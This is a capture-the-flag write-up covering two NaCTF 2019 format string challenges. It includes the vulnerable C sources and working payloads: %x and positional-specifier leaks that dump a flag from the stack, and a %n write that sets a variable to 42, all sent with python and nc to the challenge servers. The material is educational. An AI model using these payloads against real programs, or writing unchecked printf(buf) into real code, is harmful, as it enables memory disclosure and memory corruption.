<h2>fmt0 & fmt1 - NaCTF</h2>
<p>23/09/2019</p>

<p>
In this post, I am going to go over two format string vulnerabilities that
I exploited in <a href="https://ctftime.org/event/869">NaCTF 2019</a>.
First I'm going to look at the challenge <a href="fmt0.zip">fmt0</a>.
</p>


<pre>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void vuln(char* flag)
{
	char buf[64];
	printf("Type something&gt;");
	fgets(buf, sizeof(buf), stdin);
	printf("You typed: ");
	printf(buf);
}

int main()
{
    /* Disable buffering on stdout */
    setvbuf(stdout, NULL, _IONBF, 0);

    char flag[256];
    FILE* f = fopen("./flag.txt", "r");
    if (f == NULL)
    {
        puts("flag.txt not found - ping us on discord if \
                this is happening on the shell server\n");
        exit(1);
    }
    else
    {
        fgets(flag, sizeof(flag), f);
    }
    
    vuln(flag);
    return 0;
}
</pre>

<p>
In order to start testing the program, we first need to create another
file flag.txt in the same directory, since the first thing the code does
is read the flag from the file and put it into char flag[256]. After this,
it makes a call to vuln function where it asks the user for input and puts
it into buf.
</p>

<p>
We get our cue for a format string vulnerability as soon as we observe
that buf is being put into printf as an argument (in the vuln function).
If it were in this form: printf("%s",buf);, our printf would have been
safe, but since the developer didn't put any format string specifiers on
his own, we can exploit this program. Our goal is to read the contents of
the flag array that is kept in the stack frame of the main function. Let's
start small and see what happens when we insert a format specifier into
the program.
</p>

<pre>
$ ./format-0
Type something&gt;AAAA
You typed: AAAA

$ ./format-0
Type something&gt;%x
You typed: 40

$ ./format-0
Type something&gt;%d
You typed: 64
</pre>

<p>
The reason we get a 40 when we put a %x is because what a format specifier
does is pop the next value off the stack and display it, ideally this
value on the stack should be mentioned by the developer using arguments in
printf, when not, we can essentially read the entire stack. When we
convert 40 from hexadecimal to decimal we see that it turns out to be 64
which is the length of the char array buf. Interesting.
</p>

<p>
Now, let's try reading more values from the stack.
</p>

<pre>
$ ./format-0
Type something&gt;AAAA.%08x.%08x.%08x.%08x.
You typed: AAAA.00000040.f7f675c0.f7df504c.41414141.

$ ./format-0
Type something&gt;AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
You typed: AAAA.00000040.f7ecf5c0.f7d5d04c.41414141.3830252e.30252e78.252e7838.2e783830.
</pre>

<p>
Here, %08x is to display the values from the stack as hexadecimal numbers
padded with eight zeros. So the 40 appears as 00000040. Towards the end
you can see 41414141 which is the same as the AAAA, but in hexadecimal
format. Which means that after popping a few values off the stack, we get
to the starting point of our string.
</p>

<p>
Now, if you recall, our goal was to read the flag that is kept in the
stack frame of the main function. We can do this the better way the help
of gdb or we can do it the crappy way using hit and try (like I did). So I
kept increasing the number of %08x's looking for ASCII values. Then I
stumbled upon the offset format specifier which I coupled up with a python
loop to get the contents of memory addresses that flag spans.
</p>

<pre>
$ python -c 'for i in range(40,30,-1): print("%"+str(i)+"$x"),' | ./format-0
Type something&gt;You typed: a7d6761 6c665f79 6d6d7564 5f735f72 6179616e 5f796168 62615f73 695f7369 68747b66 7463616e
</pre>

<p>
The %[num][fs]$ helps us use the format specifier fs at an offset num from
the beginning of where we start	reading the stack. We need this, since our
string isn't long enough to reach flag using %08x's. We can see that the
values that we are getting are in the ASCII range,	so we head up to a hex
to ASCII converter online and get it converted.
</p>

<p>
You might have noticed that I am running the loop backwards from 40 to 30.
This is because of little-endianness. For example if you store ABCD EFGH
on a stack and later retrieve it, it will be something like DCBA HGFE. So
the individual bytes are reversed, but not the entire word. Therefore in
order to retrieve it, I go in reverse order and I get HGFE DCBA which can
then be easily reverse to get the original order. Keep in mind that all of
this can be done using an elegant python script, but I was lazy so I just
hacked it together.
</p>

<pre>
6761 6c665f79 6d6d7564 5f735f72 6179616e 5f796168 62615f73 695f7369 68747b66 7463616e
galf_ymmud_s_rayan_yahba_si_siht{ftcan
</pre>

<p>
I spliced out the first two bytes since they were garbage values. Now, we
need to reverse the string once more to get the final flag. And we are 
again going to use an online tool (because we don't know how to reverse a
string in any other efficient way).
</p>

<pre>
nactf{this_is_abhay_nayar_s_dummy_flag
</pre>

<p>
This is the value that I wrote in the file flag.txt that I created in the
beginning.  I also had a closing bracket but apparently I made an off by
one error.  Now we just need to run this on the server to get the flag.
</p>

<pre>
python -c 'for i in range(31,41): print("%"+str(i)+"$x "),' | nc shell.2019.nactf.com 31782
</pre>

<p>
After some formatting and hacking around:<br>
Flag: <b>nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}</b>
</p>

<hr>

<p>On to the next challenge: <a href="fmt1.zip">fmt1</a></p>

<pre>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void win()
{
    char flag[256];
    FILE* f = fopen("./flag.txt", "r");
    if (f == NULL)
    {
        puts("flag.txt not found - ping us on discord if \
                this is happening on the shell server\n");
        exit(1);
    }
    else
    {
        fgets(flag, sizeof(flag), f);
        puts(flag);
    }
}

void vuln(int* num)
{
    char buf[64];
    printf("Type something&gt;");
    fgets(buf, sizeof(buf), stdin);
    printf("You typed: ");
    printf(buf);
}

int main()
{
    /* Disable buffering on stdout */
    setvbuf(stdout, NULL, _IONBF, 0);
    
    int num = 69;
    vuln(&amp;num);

    if (num == 42)
    {
        puts("You win!");
        win();
    }
    else
    {
        printf("%d != 42, try again", num);
    }

    return 0;
}
</pre>

<p>
This is a slightly modified version of the above challenge. The key thing
to note is that now the flag is being read from a file only after we pass
the condition check num == 42. So somehow we need to modify the the value
of num. 
</p>

<p>
Another thing that I struggled for a while on this challenge was
randomized address values.  Apparently gdb gives you the same address
values when you debug a program, so when I finally "solved" the challenge
in gdb, I was dissapointed to realize that it didn't work on their server.
Using the -p flag you can attach a process to gdb and see that you get
different values for the address of num every time you run it.
</p>

<p>
Getting back to the problem, our goal is to change the value of num such
that it equals 42.  There is only one format specifier that can help you
write values: %n. What it does is write the number of characters so far in
the printf statement to the given variable on the stack. So for example
AAAA%n will write the value 4 into the address that it finds as soon as it
pops the stack.
</p>

<p>
With this information in mind, we realize that we need two things:
<ul>
<li>Address of the variable we need to change.</li>
<li>Address of where the format specifiers start reading from.</li>
</ul>
</p>

<p>
Luckily we don't have to go to the main's stack to change num. In fact,
the address of num keeps changing, so we can only use the pointer to num.
The second address can easily be figured out by entering some recognizable
sequence such as "AAAAABBBB...%x.%x." and then inspecting the memory
immediately after the buffer is filled.
</p>

<p>
With these two addresses, we can get the offset value and using the same
technique as above this time with the %n specifier, we can write the
value. After some inspection with gdb, I figured out the the offset was
24. So instead of printing the exact address, we could get the offset. We
were lucky to have num passed as an argument to the function (even though
it serves no other purpose than to help us solve the challenge).
</p>

<pre>
$ python -c 'print "%42x%24$n"' | nc shell.2019.nactf.com 31560
Type something&gt;You typed:                                         40
You win!
nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}
</pre>

<p>
Just like we used %08x in the first challenge to pad the address values,
we are using %42x here because that's what we want %n to write, into the
given address of num.
</p>

<p>
Flag: <b>nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}</b>
</p>

</body>
</html>
